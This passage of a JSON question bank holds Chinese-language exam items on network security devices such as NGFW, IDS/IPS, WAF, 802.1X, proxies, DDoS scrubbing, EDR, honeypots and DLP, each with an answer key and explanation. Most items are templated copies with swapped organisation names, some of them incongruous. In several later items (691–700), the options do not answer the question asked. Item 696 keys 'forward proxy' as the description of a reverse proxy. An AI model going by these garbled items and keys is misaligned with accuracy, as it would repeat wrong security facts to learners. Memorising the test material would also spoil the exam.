      "B. 次世代防火牆（NGFW，具備 Layer 7 深度封包檢測 DPI 與 SSL/TLS 解密能力）",
      "C. 傳統 Layer 3 靜態封包過濾路由器",
      "D. 集線器（Hub）"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      },
      {
        "en": "NGFW",
        "zh": "次世代防火牆",
        "ipa": "/ˌen.dʒiː.efˈdʌb.əl.juː/"
      }
    ],
    "explanation": "NGFW 具備第 7 層深度封包檢驗與 SSL 解密檢驗能力，即使在 443 連接埠中亦能識別具體應用程式與隱蔽惡意負載。",
    "trap": "傳統防火牆僅檢查 Port 443 放行，無法察覺加密封包內的惡意內容。",
    "law": "Gartner NGFW 定義標準"
  },
  {
    "id": "IPAS-B-672",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某公務機關資訊處規劃於核心交換機旁部署一套入侵偵測系統（IDS），網管人員使用交換機的連接埠鏡像（Port Mirroring / SPAN）將流量複製一份送入 IDS。此種部署方式的致命限制為何？",
    "options": [
      "A. 伺服器會立即斷線崩潰",
      "B. 會導致交換機網路速度降低 99%",
      "C. 採旁路監控（Out-of-band）只能被動發出告警，無法在封包到達目標前即時攔截阻斷",
      "D. 無法分析任何網路封包"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "IDS",
        "zh": "入侵偵測系統 (旁路監控)",
        "ipa": "/ˌaɪ.diːˈes/"
      }
    ],
    "explanation": "IDS 透過 Mirror Port 接收複製流量，封包此時早已送達目的地，因此 IDS 只能事後告警，完全無法即時阻斷連線。",
    "trap": "需要即時阻斷者必須採用 Inline 串聯部署之 IPS。",
    "law": "NIST SP 800-94"
  },
  {
    "id": "IPAS-B-673",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心為防止外部勒索軟體的漏洞利用攻擊封包進入內部伺服器，資安主管要求資安設備必須具備「在攻擊封包到達受害伺服器前，立即予以主動丟棄阻斷（Drop Packet）」之能力。該設備必須採何種架構部署？",
    "options": [
      "A. 採用 Inline（串聯）方式部署於網路通訊核心路徑上之 IPS",
      "B. 僅使用本機記事本記錄",
      "C. 採用旁路監聽方式部署之網路分析儀",
      "D. 關閉所有網路交換機"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "IPS",
        "zh": "入侵防禦系統 (串聯阻斷)",
        "ipa": "/ˌaɪ.piːˈes/"
      }
    ],
    "explanation": "IPS 必須以 Inline（串聯）方式像守門員一樣跨接在線路上，所有封包流經 IPS 本體檢驗，確認惡意立即執行 Drop 阻斷。",
    "trap": "串聯部署若設備故障需具備 Hardware Bypass 機制以確保網路不斷線。",
    "law": "NIST SP 800-94"
  },
  {
    "id": "IPAS-B-674",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某區域教學醫學中心對外提供之線上購物網站近期頻繁遭受 SQL 注入與跨網站腳本（XSS）攻擊。若要在不改動應用程式原始碼之前提下迅速在網路邊界建立防護，應優先在 Web 伺服器前端部署：",
    "options": [
      "A. 本機防毒軟體",
      "B. 傳統 Layer 3 網路防火牆",
      "C. 磁帶備份機",
      "D. 網站應用程式防火牆（WAF, Web Application Firewall）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      },
      {
        "en": "WAF",
        "zh": "網站應用程式防火牆",
        "ipa": "/wæf/"
      }
    ],
    "explanation": "WAF 專為 HTTP/HTTPS 打造，能深入剖析 URL、Header、Cookie 與 POST Body，阻絕 SQLi、XSS、WebShell 等 Web 應用漏洞。",
    "trap": "一般網路防火牆無法理解 HTTP 語意與 SQL 注入語法。",
    "law": "PCI DSS 要求 6.6"
  },
  {
    "id": "IPAS-B-675",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心為防範外來訪客或外包廠商未經核准之個人筆電隨意插入辦公室實體網路孔存取內網，企業應在區域網路交換器上導入何種網路存取控制標準？",
    "options": [
      "A. 802.1X 網路接取控制（NAC, Network Access Control）",
      "B. 允許所有人免認證使用",
      "C. 停用所有交換器電源",
      "D. 改用家用集線器"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "802.1X 搭配 RADIUS 伺服器，可在端點網線插上交換器時強制進行身分認證與健康度檢查，未通過者直接劃入隔離 VLAN。",
    "trap": "能有效防止外來未授權設備私接內網（Rogue Device）。",
    "law": "IEEE 802.1X 標準"
  },
  {
    "id": "IPAS-B-676",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某跨國金融控股銀行規劃於內部網路邊界部署代理伺服器（Proxy），用以統一管制全公司同仁上網行為、過濾惡意釣魚網址並快取網頁以節省外網頻寬。此種代理伺服器型態屬於：",
    "options": [
      "A. 入侵防禦系統",
      "B. 正向代理（Forward Proxy，代理內部用戶端向外網伺服器發起存取）",
      "C. 反向代理（Reverse Proxy）",
      "D. 蜜罐系統"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "Forward Proxy 位於用戶端前端，代表用戶端向外部網站請求，具備集中上網稽核、網址過濾與快取功能；Reverse Proxy 則是為後端伺服器擋在前端。",
    "trap": "口訣：保護內部訪客向外上網是正向代理；保護後台伺服器對外提供服務是反向代理。",
    "law": "RFC 7230"
  },
  {
    "id": "IPAS-B-677",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商在舉辦週年慶促銷活動期間，官方電商網站突遭超過 300 Gbps 的巨量反射放大攻擊（DNS/NTP Amplification DDoS）導致對外頻寬瞬間塞爆癱瘓。此時內部自建防火牆已完全無法承受，最適當之應變處置為：",
    "options": [
      "A. 重啟內部路由器",
      "B. 立即將對外 DNS 解析切換至雲端抗 DDoS 流量清洗服務（Scrubbing Center）或 CDN",
      "C. 在內部防火牆手動逐筆封鎖 IP",
      "D. 將伺服器網線拔除"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "DDoS",
        "zh": "分散式阻斷服務攻擊",
        "ipa": "/ˌdiːˈdɑːs/"
      },
      {
        "en": "NTP",
        "zh": "網路時間協定",
        "ipa": "/ˌen.tiːˈpiː/"
      }
    ],
    "explanation": "當流量超過實體線路頻寬（Pipe Saturation）時，在地端做任何阻擋皆無效（水管已被塞滿），必須由雲端流量清洗中心在大骨幹網將惡意流量清洗過濾後再回傳乾淨流量。",
    "trap": "單純在本地端防火牆封鎖 IP 無法解決頻寬被塞爆的問題。",
    "law": "CISA DDoS 緩解指南"
  },
  {
    "id": "IPAS-B-678",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某金流與行動支付科技公司傳統防毒軟體每日更新病毒特徵碼，但某日仍遭到全新變種勒索軟體穿透。資安顧問指出傳統防毒軟體難以防禦零日攻擊（Zero-day），建議導入結合機器學習與行為啟發之何種技術？",
    "options": [
      "A. 停用 Windows 內建防火牆",
      "B. 增加硬碟儲存容量",
      "C. 移除所有防毒軟體",
      "D. 次世代防毒（NGAV）與端點行為監控（EDR）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "EDR",
        "zh": "端點偵測與回應",
        "ipa": "/ˌiː.diːˈɑːr/"
      }
    ],
    "explanation": "傳統特徵碼防毒對未知的 Zero-day 無法比對出 Hash；NGAV 透過機器學習與行為啟發式分析（如偵測注入、提權、異常連線）可防範未知威脅。",
    "trap": "擺脫對靜態特徵庫的絕對依賴是端點安全的重大演進。",
    "law": "Gartner 端點防護平台報告"
  },
  {
    "id": "IPAS-B-679",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某高科技晶圓代工大廠在內部伺服器網段中部署了一台刻意未打補丁且偽裝成核心資料庫的「蜜罐伺服器（Honeypot）」。若監控系統突然收到該蜜罐伺服器被內部某台 PC 連線之警報，資安分析師應如何判定該警報？",
    "options": [
      "A. 該警報具有極高真實性與威脅性，代表內部已有受害或具惡意意圖之主機正在進行內網橫向刺探",
      "B. 代表蜜罐軟體損壞",
      "C. 判定為系統誤報，直接忽略",
      "D. 代表網路速度過慢"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "蜜罐在正常業務中絕不應有任何人連線存取，任何對蜜罐的觸發皆屬於高度可疑的黑客探測或內部橫向移動行為，誤報率極低。",
    "trap": "蜜罐警報優先級通常設定為極高，需立即介入排查發起端。",
    "law": "SANS 誘捕防禦指南"
  },
  {
    "id": "IPAS-B-680",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠為落實客戶個人資料外流防護，在電子郵件閘道端啟用了資料外洩防護（DLP）規則。當員工企圖透過郵件將含有身分證字號清單之 Excel 寄給私人信箱時，DLP 主要透過何種技術識別出機敏資料？",
    "options": [
      "A. 關鍵字規則與正規表達式（Regular Expression, RegEx）內容識別技術",
      "B. 檢查寄件時間是否在下班時間",
      "C. 僅檢查電子郵件主旨長度",
      "D. 僅壓縮電子郵件大小"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "DLP 透過深層內容剖析（DPI）搭配正規表達式（比對身分證格式、信用卡 Luhn 演算法校驗碼）與資料特徵指紋（Fingerprinting），精準識別機敏文件。",
    "trap": "單純看副檔名無法防範員工將機敏資料複製到純文字檔外傳。",
    "law": "ISO/IEC 27001 A.8.12 DLP 控制"
  },
  {
    "id": "IPAS-B-681",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某公務機關資訊處內部網路頻繁遭受駭客將惡意命令隱藏於標準 HTTPS（Port 443）流量中外傳機密。傳統 Layer 4 狀態檢查防火牆因 Port 443 開放而全數放行。企業最應導入何種邊界設備以落實第 7 層應用程式內容與 SSL 解密檢驗？",
    "options": [
      "A. 次世代防火牆（NGFW，具備 Layer 7 深度封包檢測 DPI 與 SSL/TLS 解密能力）",
      "B. 傳統 Layer 3 靜態封包過濾路由器",
      "C. 無線基地台（AP）",
      "D. 集線器（Hub）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      },
      {
        "en": "NGFW",
        "zh": "次世代防火牆",
        "ipa": "/ˌen.dʒiː.efˈdʌb.əl.juː/"
      }
    ],
    "explanation": "NGFW 具備第 7 層深度封包檢驗與 SSL 解密檢驗能力，即使在 443 連接埠中亦能識別具體應用程式與隱蔽惡意負載。",
    "trap": "傳統防火牆僅檢查 Port 443 放行，無法察覺加密封包內的惡意內容。",
    "law": "Gartner NGFW 定義標準"
  },
  {
    "id": "IPAS-B-682",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某國立頂尖研究型大學規劃於核心交換機旁部署一套入侵偵測系統（IDS），網管人員使用交換機的連接埠鏡像（Port Mirroring / SPAN）將流量複製一份送入 IDS。此種部署方式的致命限制為何？",
    "options": [
      "A. 採旁路監控（Out-of-band）只能被動發出告警，無法在封包到達目標前即時攔截阻斷",
      "B. 會導致交換機網路速度降低 99%",
      "C. 無法分析任何網路封包",
      "D. 伺服器會立即斷線崩潰"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "IDS",
        "zh": "入侵偵測系統 (旁路監控)",
        "ipa": "/ˌaɪ.diːˈes/"
      }
    ],
    "explanation": "IDS 透過 Mirror Port 接收複製流量，封包此時早已送達目的地，因此 IDS 只能事後告警，完全無法即時阻斷連線。",
    "trap": "需要即時阻斷者必須採用 Inline 串聯部署之 IPS。",
    "law": "NIST SP 800-94"
  },
  {
    "id": "IPAS-B-683",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某區域教學醫學中心為防止外部勒索軟體的漏洞利用攻擊封包進入內部伺服器，資安主管要求資安設備必須具備「在攻擊封包到達受害伺服器前，立即予以主動丟棄阻斷（Drop Packet）」之能力。該設備必須採何種架構部署？",
    "options": [
      "A. 採用 Inline（串聯）方式部署於網路通訊核心路徑上之 IPS",
      "B. 關閉所有網路交換機",
      "C. 採用旁路監聽方式部署之網路分析儀",
      "D. 僅使用本機記事本記錄"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "IPS",
        "zh": "入侵防禦系統 (串聯阻斷)",
        "ipa": "/ˌaɪ.piːˈes/"
      }
    ],
    "explanation": "IPS 必須以 Inline（串聯）方式像守門員一樣跨接在線路上，所有封包流經 IPS 本體檢驗，確認惡意立即執行 Drop 阻斷。",
    "trap": "串聯部署若設備故障需具備 Hardware Bypass 機制以確保網路不斷線。",
    "law": "NIST SP 800-94"
  },
  {
    "id": "IPAS-B-684",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商對外提供之線上購物網站近期頻繁遭受 SQL 注入與跨網站腳本（XSS）攻擊。若要在不改動應用程式原始碼之前提下迅速在網路邊界建立防護，應優先在 Web 伺服器前端部署：",
    "options": [
      "A. 傳統 Layer 3 網路防火牆",
      "B. 網站應用程式防火牆（WAF, Web Application Firewall）",
      "C. 本機防毒軟體",
      "D. 磁帶備份機"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      },
      {
        "en": "WAF",
        "zh": "網站應用程式防火牆",
        "ipa": "/wæf/"
      }
    ],
    "explanation": "WAF 專為 HTTP/HTTPS 打造，能深入剖析 URL、Header、Cookie 與 POST Body，阻絕 SQLi、XSS、WebShell 等 Web 應用漏洞。",
    "trap": "一般網路防火牆無法理解 HTTP 語意與 SQL 注入語法。",
    "law": "PCI DSS 要求 6.6"
  },
  {
    "id": "IPAS-B-685",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠為防範外來訪客或外包廠商未經核准之個人筆電隨意插入辦公室實體網路孔存取內網，企業應在區域網路交換器上導入何種網路存取控制標準？",
    "options": [
      "A. 802.1X 網路接取控制（NAC, Network Access Control）",
      "B. 允許所有人免認證使用",
      "C. 停用所有交換器電源",
      "D. 改用家用集線器"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "802.1X 搭配 RADIUS 伺服器，可在端點網線插上交換器時強制進行身分認證與健康度檢查，未通過者直接劃入隔離 VLAN。",
    "trap": "能有效防止外來未授權設備私接內網（Rogue Device）。",
    "law": "IEEE 802.1X 標準"
  },
  {
    "id": "IPAS-B-686",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠規劃於內部網路邊界部署代理伺服器（Proxy），用以統一管制全公司同仁上網行為、過濾惡意釣魚網址並快取網頁以節省外網頻寬。此種代理伺服器型態屬於：",
    "options": [
      "A. 反向代理（Reverse Proxy）",
      "B. 入侵防禦系統",
      "C. 蜜罐系統",
      "D. 正向代理（Forward Proxy，代理內部用戶端向外網伺服器發起存取）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "Forward Proxy 位於用戶端前端，代表用戶端向外部網站請求，具備集中上網稽核、網址過濾與快取功能；Reverse Proxy 則是為後端伺服器擋在前端。",
    "trap": "口訣：保護內部訪客向外上網是正向代理；保護後台伺服器對外提供服務是反向代理。",
    "law": "RFC 7230"
  },
  {
    "id": "IPAS-B-687",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某國立頂尖研究型大學在舉辦週年慶促銷活動期間，官方電商網站突遭超過 300 Gbps 的巨量反射放大攻擊（DNS/NTP Amplification DDoS）導致對外頻寬瞬間塞爆癱瘓。此時內部自建防火牆已完全無法承受，最適當之應變處置為：",
    "options": [
      "A. 將伺服器網線拔除",
      "B. 立即將對外 DNS 解析切換至雲端抗 DDoS 流量清洗服務（Scrubbing Center）或 CDN",
      "C. 在內部防火牆手動逐筆封鎖 IP",
      "D. 重啟內部路由器"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "DDoS",
        "zh": "分散式阻斷服務攻擊",
        "ipa": "/ˌdiːˈdɑːs/"
      },
      {
        "en": "NTP",
        "zh": "網路時間協定",
        "ipa": "/ˌen.tiːˈpiː/"
      }
    ],
    "explanation": "當流量超過實體線路頻寬（Pipe Saturation）時，在地端做任何阻擋皆無效（水管已被塞滿），必須由雲端流量清洗中心在大骨幹網將惡意流量清洗過濾後再回傳乾淨流量。",
    "trap": "單純在本地端防火牆封鎖 IP 無法解決頻寬被塞爆的問題。",
    "law": "CISA DDoS 緩解指南"
  },
  {
    "id": "IPAS-B-688",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商傳統防毒軟體每日更新病毒特徵碼，但某日仍遭到全新變種勒索軟體穿透。資安顧問指出傳統防毒軟體難以防禦零日攻擊（Zero-day），建議導入結合機器學習與行為啟發之何種技術？",
    "options": [
      "A. 增加硬碟儲存容量",
      "B. 次世代防毒（NGAV）與端點行為監控（EDR）",
      "C. 停用 Windows 內建防火牆",
      "D. 移除所有防毒軟體"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "EDR",
        "zh": "端點偵測與回應",
        "ipa": "/ˌiː.diːˈɑːr/"
      }
    ],
    "explanation": "傳統特徵碼防毒對未知的 Zero-day 無法比對出 Hash；NGAV 透過機器學習與行為啟發式分析（如偵測注入、提權、異常連線）可防範未知威脅。",
    "trap": "擺脫對靜態特徵庫的絕對依賴是端點安全的重大演進。",
    "law": "Gartner 端點防護平台報告"
  },
  {
    "id": "IPAS-B-689",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某金流與行動支付科技公司在內部伺服器網段中部署了一台刻意未打補丁且偽裝成核心資料庫的「蜜罐伺服器（Honeypot）」。若監控系統突然收到該蜜罐伺服器被內部某台 PC 連線之警報，資安分析師應如何判定該警報？",
    "options": [
      "A. 判定為系統誤報，直接忽略",
      "B. 該警報具有極高真實性與威脅性，代表內部已有受害或具惡意意圖之主機正在進行內網橫向刺探",
      "C. 代表網路速度過慢",
      "D. 代表蜜罐軟體損壞"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "蜜罐在正常業務中絕不應有任何人連線存取，任何對蜜罐的觸發皆屬於高度可疑的黑客探測或內部橫向移動行為，誤報率極低。",
    "trap": "蜜罐警報優先級通常設定為極高，需立即介入排查發起端。",
    "law": "SANS 誘捕防禦指南"
  },
  {
    "id": "IPAS-B-690",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某大型連鎖量販流通集團為落實客戶個人資料外流防護，在電子郵件閘道端啟用了資料外洩防護（DLP）規則。當員工企圖透過郵件將含有身分證字號清單之 Excel 寄給私人信箱時，DLP 主要透過何種技術識別出機敏資料？",
    "options": [
      "A. 檢查寄件時間是否在下班時間",
      "B. 僅檢查電子郵件主旨長度",
      "C. 關鍵字規則與正規表達式（Regular Expression, RegEx）內容識別技術",
      "D. 僅壓縮電子郵件大小"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "DLP 透過深層內容剖析（DPI）搭配正規表達式（比對身分證格式、信用卡 Luhn 演算法校驗碼）與資料特徵指紋（Fingerprinting），精準識別機敏文件。",
    "trap": "單純看副檔名無法防範員工將機敏資料複製到純文字檔外傳。",
    "law": "ISO/IEC 27001 A.8.12 DLP 控制"
  },
  {
    "id": "IPAS-B-691",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": false,
    "question": "相較於傳統網路層狀態檢驗防火牆（Stateful Inspection Firewall），次世代防火牆（NGFW）最核心之技術優勢在於：",
    "options": [
      "A. 集線器（Hub）",
      "B. 次世代防火牆（NGFW，具備 Layer 7 深度封包檢測 DPI 與 SSL/TLS 解密能力）",
      "C. 無線基地台（AP）",
      "D. 傳統 Layer 3 靜態封包過濾路由器"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      },
      {
        "en": "NGFW",
        "zh": "次世代防火牆",
        "ipa": "/ˌen.dʒiː.efˈdʌb.əl.juː/"
      }
    ],
    "explanation": "NGFW 具備第 7 層深度封包檢驗與 SSL 解密檢驗能力，即使在 443 連接埠中亦能識別具體應用程式與隱蔽惡意負載。",
    "trap": "傳統防火牆僅檢查 Port 443 放行，無法察覺加密封包內的惡意內容。",
    "law": "Gartner NGFW 定義標準"
  },
  {
    "id": "IPAS-B-692",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": false,
    "question": "入侵偵測系統（IDS）與入侵防禦系統（IPS）最根本之運作架構差異為何？",
    "options": [
      "A. 會導致交換機網路速度降低 99%",
      "B. 採旁路監控（Out-of-band）只能被動發出告警，無法在封包到達目標前即時攔截阻斷",
      "C. 伺服器會立即斷線崩潰",
      "D. 無法分析任何網路封包"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "IDS",
        "zh": "入侵偵測系統 (旁路監控)",
        "ipa": "/ˌaɪ.diːˈes/"
      },
      {
        "en": "IPS",
        "zh": "入侵防禦系統 (串聯阻斷)",
        "ipa": "/ˌaɪ.piːˈes/"
      }
    ],
    "explanation": "IDS 透過 Mirror Port 接收複製流量，封包此時早已送達目的地，因此 IDS 只能事後告警，完全無法即時阻斷連線。",
    "trap": "需要即時阻斷者必須採用 Inline 串聯部署之 IPS。",
    "law": "NIST SP 800-94"
  },
  {
    "id": "IPAS-B-693",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": false,
    "question": "在網路安全架構中，IPS 通常採用何種方式部署於網路鏈路上，以便能夠即時檢查並阻斷流經之惡意封包？",
    "options": [
      "A. 採用 Inline（串聯）方式部署於網路通訊核心路徑上之 IPS",
      "B. 採用旁路監聽方式部署之網路分析儀",
      "C. 關閉所有網路交換機",
      "D. 僅使用本機記事本記錄"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "IPS",
        "zh": "入侵防禦系統 (串聯阻斷)",
        "ipa": "/ˌaɪ.piːˈes/"
      }
    ],
    "explanation": "IPS 必須以 Inline（串聯）方式像守門員一樣跨接在線路上，所有封包流經 IPS 本體檢驗，確認惡意立即執行 Drop 阻斷。",
    "trap": "串聯部署若設備故障需具備 Hardware Bypass 機制以確保網路不斷線。",
    "law": "NIST SP 800-94"
  },
  {
    "id": "IPAS-B-694",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": false,
    "question": "網站應用程式防火牆（WAF）主要運作於 OSI 模型的哪一層，專門用於解析與防護 Web 應用威脅？",
    "options": [
      "A. 傳統 Layer 3 網路防火牆",
      "B. 網站應用程式防火牆（WAF, Web Application Firewall）",
      "C. 本機防毒軟體",
      "D. 磁帶備份機"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      },
      {
        "en": "WAF",
        "zh": "網站應用程式防火牆",
        "ipa": "/wæf/"
      }
    ],
    "explanation": "WAF 專為 HTTP/HTTPS 打造，能深入剖析 URL、Header、Cookie 與 POST Body，阻絕 SQLi、XSS、WebShell 等 Web 應用漏洞。",
    "trap": "一般網路防火牆無法理解 HTTP 語意與 SQL 注入語法。",
    "law": "PCI DSS 要求 6.6"
  },
  {
    "id": "IPAS-B-695",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": false,
    "question": "IEEE 802.1X 協定在企業端點安全架構中主要扮演何種角色？",
    "options": [
      "A. 停用所有交換器電源",
      "B. 允許所有人免認證使用",
      "C. 改用家用集線器",
      "D. 802.1X 網路接取控制（NAC, Network Access Control）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "802.1X 搭配 RADIUS 伺服器，可在端點網線插上交換器時強制進行身分認證與健康度檢查，未通過者直接劃入隔離 VLAN。",
    "trap": "能有效防止外來未授權設備私接內網（Rogue Device）。",
    "law": "IEEE 802.1X 標準"
  },
  {
    "id": "IPAS-B-696",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": false,
    "question": "關於「反向代理伺服器（Reverse Proxy）」之定位與功能，下列敘述何者正確？",
    "options": [
      "A. 反向代理（Reverse Proxy）",
      "B. 入侵防禦系統",
      "C. 正向代理（Forward Proxy，代理內部用戶端向外網伺服器發起存取）",
      "D. 蜜罐系統"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "Forward Proxy 位於用戶端前端，代表用戶端向外部網站請求，具備集中上網稽核、網址過濾與快取功能；Reverse Proxy 則是為後端伺服器擋在前端。",
    "trap": "口訣：保護內部訪客向外上網是正向代理；保護後台伺服器對外提供服務是反向代理。",
    "law": "RFC 7230"
  },
  {
    "id": "IPAS-B-697",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": false,
    "question": "面對超過企業出口總頻寬容量之大規模體積型（Volumetric）DDoS 洪水攻擊，最有效的防禦策略通常為：",
    "options": [
      "A. 立即將對外 DNS 解析切換至雲端抗 DDoS 流量清洗服務（Scrubbing Center）或 CDN",
      "B. 在內部防火牆手動逐筆封鎖 IP",
      "C. 重啟內部路由器",
      "D. 將伺服器網線拔除"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "DDoS",
        "zh": "分散式阻斷服務攻擊",
        "ipa": "/ˌdiːˈdɑːs/"
      }
    ],
    "explanation": "當流量超過實體線路頻寬（Pipe Saturation）時，在地端做任何阻擋皆無效（水管已被塞滿），必須由雲端流量清洗中心在大骨幹網將惡意流量清洗過濾後再回傳乾淨流量。",
    "trap": "單純在本地端防火牆封鎖 IP 無法解決頻寬被塞爆的問題。",
    "law": "CISA DDoS 緩解指南"
  },
  {
    "id": "IPAS-B-698",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": false,
    "question": "端點防護中，次世代防毒（NGAV）與端點偵測回應（EDR）主要擺脫了對下列何者的單一依賴？",
    "options": [
      "A. 停用 Windows 內建防火牆",
      "B. 增加硬碟儲存容量",
      "C. 移除所有防毒軟體",
      "D. 次世代防毒（NGAV）與端點行為監控（EDR）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "EDR",
        "zh": "端點偵測與回應",
        "ipa": "/ˌiː.diːˈɑːr/"
      }
    ],
    "explanation": "傳統特徵碼防毒對未知的 Zero-day 無法比對出 Hash；NGAV 透過機器學習與行為啟發式分析（如偵測注入、提權、異常連線）可防範未知威脅。",
    "trap": "擺脫對靜態特徵庫的絕對依賴是端點安全的重大演進。",
    "law": "Gartner 端點防護平台報告"
  },
  {
    "id": "IPAS-B-699",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": false,
    "question": "資安領域中所稱之「蜜罐（Honeypot）」技術，其核心設計哲學與警報特性為何？",
    "options": [
      "A. 該警報具有極高真實性與威脅性，代表內部已有受害或具惡意意圖之主機正在進行內網橫向刺探",
      "B. 代表蜜罐軟體損壞",
      "C. 代表網路速度過慢",
      "D. 判定為系統誤報，直接忽略"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "蜜罐在正常業務中絕不應有任何人連線存取，任何對蜜罐的觸發皆屬於高度可疑的黑客探測或內部橫向移動行為，誤報率極低。",
    "trap": "蜜罐警報優先級通常設定為極高，需立即介入排查發起端。",
    "law": "SANS 誘捕防禦指南"
  },
  {
    "id": "IPAS-B-700",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": false,
    "question": "資料外洩防護（DLP, Data Loss Prevention）系統在進行網路外傳內容檢測時，最常使用何種技術來精準識別信用卡號或身分證字號？",
    "options": [
      "A. 僅檢查電子郵件主旨長度",
      "B. 關鍵字規則與正規表達式（Regular Expression, RegEx）內容識別技術",
      "C. 檢查寄件時間是否在下班時間",
      "D. 僅壓縮電子郵件大小"
    ],
    "answer": "B",
    "terms": [],
